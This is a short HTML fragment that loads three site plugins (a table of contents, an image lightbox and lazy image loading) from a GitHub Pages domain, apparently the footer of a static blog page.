 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
